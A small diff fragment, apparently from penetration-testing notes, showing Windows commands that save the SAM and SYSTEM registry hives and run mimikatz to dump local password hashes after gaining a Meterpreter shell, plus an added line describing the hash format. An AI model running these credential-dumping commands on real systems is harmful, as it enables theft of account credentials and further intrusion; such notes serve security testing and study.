@@ -51,3 +51,5 @@ Meterpreter shell: need to migrate to lsass process to dump hashes, due to proce
 
     C:\Temp> reg save hklm\sam sam.hive && reg save hklm\system system.hiv     
     C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv /system:system.hiv" "exit"   
+    
+    username:userid:LANMAN:NTHASH   #hash format when extracted  
